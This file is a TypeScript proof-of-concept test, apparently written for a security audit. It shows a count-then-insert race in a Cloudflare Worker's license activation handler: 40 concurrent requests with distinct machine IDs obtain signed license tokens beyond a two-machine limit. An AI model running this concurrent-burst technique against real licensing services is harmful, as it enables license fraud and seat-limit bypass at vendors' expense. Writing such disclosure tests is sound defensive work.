/**
 * p10-010 PoC — machine seat-limit TOCTOU (count-then-insert race).
 * NOT part of the project test suite.
 *
 * Runs the REAL worker (src/worker.ts) in workerd against local D1 with the
 * production migration schema. Vulnerable path: handlers/license.ts
 * registerOrTouchMachine() — separate SELECT COUNT(*) round-trip
 * (license.ts:286-303) and INSERT (license.ts:305-315), no transaction and no
 * conditional insert. The UNIQUE(license_id, machine_id) constraint only
 * blocks duplicate ids; N concurrent activations with DISTINCT machine_ids
 * all observe COUNT(*) < max_machines before any peer INSERT commits.
 *
 * Phase A (control): 4 SEQUENTIAL activations of a max_machines=2 license with
 * distinct machine ids prove the cap holds when serialized:
 * valid,true / valid,true / valid,false ("Machine limit reached") x2.
 *
 * Phase B (exploit): 40 CONCURRENT activations of the same license, each with
 * a fresh machine_id. Every request reads the stale count before any insert
 * lands, so far more than 2 machines register and each receives a signed,
 * offline-valid license JWT (mid-bound). Ground truth read straight from D1.
 */
import '../src/cloudflare-test.d.ts';
import { describe, it, expect, beforeAll } from 'vitest';
import { env, createExecutionContext, waitOnExecutionContext } from 'cloudflare:test';
import worker from '../src/worker';

const CUSTOMER_ID = 'p10-010-cust';
const LICENSE_ID = 'p10-010-lic';
const LICENSE_KEY = 'lic-p10-010-toctou-key';
// Dedicated license for the concurrent-burst phase so the serialized control
// phase cannot consume its seats first.
const RACE_LICENSE_ID = 'p10-010-race-lic';
const RACE_LICENSE_KEY = 'lic-p10-010-race-key';
const MAX_MACHINES = 2;
const BURST_SIZE = 40;

function req(body: string): Request {
  return new Request('http://localhost/api/validate-license', {
    method: 'POST',
    headers: new Headers({ 'Content-Type': 'application/json' }),
    body,
  });
}

async function dispatch(request: Request): Promise<Response> {
  const context = createExecutionContext();
  const response = await worker.fetch(request, env, context);
  await waitOnExecutionContext(context);
  return response;
}

function activate(licenseKey: string, machineId: string): Request {
  return req(
    JSON.stringify({
      license_key: licenseKey,
      machine_id: machineId,
      user_name: 'attacker',
      user_email: 'attacker@seat.test',
    })
  );
}

function jwtMid(token: [REDACTED:secret] string | null {
  const part = token.split('.')[1];
  if (part === undefined) return null;
  try {
    const json = JSON.parse(atob(part.replace(/-/g, '+').replace(/_/g, '/')));
    return typeof json.mid === 'string' ? json.mid : null;
  } catch {
    return null;
  }
}

describe('p10-010: seat-limit count-then-insert TOCTOU', () => {
  beforeAll(async () => {
    // Default production posture: HS256 signing via JWT_SECRET.
    (env as Record<string, unknown>).JWT_SECRET = 'p11-test-jwt-secret';

    await env.DB.prepare(
      `INSERT INTO customers (id, email, company, tier) VALUES (?, ?, 'SeatRace Co', 'pro')`
    )
      .bind(CUSTOMER_ID, 'owner@seat.test')
      .run();
    await env.DB.prepare(
      `INSERT INTO licenses (id, customer_id, license_key, tier, status, max_seats, max_machines, expires_at)
       VALUES (?, ?, ?, 'pro', 'active', ?, ?, NULL)`
    )
      .bind(LICENSE_ID, CUSTOMER_ID, LICENSE_KEY, MAX_MACHINES, MAX_MACHINES)
      .run();
    await env.DB.prepare(
      `INSERT INTO licenses (id, customer_id, license_key, tier, status, max_seats, max_machines, expires_at)
       VALUES (?, ?, ?, 'pro', 'active', ?, ?, NULL)`
    )
      .bind(RACE_LICENSE_ID, CUSTOMER_ID, RACE_LICENSE_KEY, MAX_MACHINES, MAX_MACHINES)
      .run();
  });

  it('control: sequential activations respect max_machines=2', async () => {
    const outcomes: boolean[] = [];
    for (let i = 0; i < MAX_MACHINES + 2; i++) {
      const res = await dispatch(activate(LICENSE_KEY, `ctl-machine-${i}`));
      const payload = (await res.json()) as { valid: boolean; error?: string };
      console.log(
        `p10-010 control #${i}: valid=${payload.valid}${payload.error ? ` error="${payload.error}"` : ''}`
      );
      outcomes.push(payload.valid);
    }
    expect(outcomes).toEqual([true, true, false, false]);
  });

  it('exploit: concurrent burst with distinct machine_ids blows past max_machines', async () => {
    const responses = await Promise.all(
      Array.from({ length: BURST_SIZE }, (_, i) => dispatch(activate(RACE_LICENSE_KEY, `race-machine-${i}`)))
    );
    const payloads = (await Promise.all(responses.map(r => r.json()))) as Array<{
      valid: boolean;
      token?: string;
      error?: string;
    }>;

    const granted = payloads.filter(p => p.valid && typeof p.token === 'string');
    const denied = payloads.filter(p => !p.valid);
    const mids = granted.map(p => jwtMid(p.token as string)).filter((m): m is string => m !== null);
    console.log(
      `p10-010 burst: ${granted.length}/${BURST_SIZE} activations returned valid=true + signed JWT (max_machines=${MAX_MACHINES}); denied=${denied.length}`
    );
    console.log(`p10-010 JWT mid claims bound to distinct machines: ${mids.slice(0, 5).join(', ')} ...`);

    // Ground truth from D1: how many active machines exist for this license?
    const countRow = await env.DB.prepare(
      `SELECT COUNT(*) AS count FROM machines WHERE license_id = ? AND is_active = 1`
    )
      .bind(RACE_LICENSE_ID)
      .first<{ count: number }>();
    const activeMachines = countRow?.count ?? -1;
    const allRows = await env.DB.prepare(
      `SELECT machine_id, is_active FROM machines WHERE license_id = ?`
    )
      .bind(RACE_LICENSE_ID)
      .all();
    console.log(
      `p10-010 DB truth: total rows for race license = ${allRows.results.length}; sample: ${JSON.stringify(allRows.results.slice(0, 6))}`
    );
    console.log(
      `p10-010 DB truth: active machines for license after burst = ${activeMachines} (paid limit: ${MAX_MACHINES})`
    );

    expect(granted.length).toBeGreaterThan(MAX_MACHINES);
    expect(activeMachines).toBeGreaterThan(MAX_MACHINES);
    expect(mids.length).toBe(granted.length);
  });
});
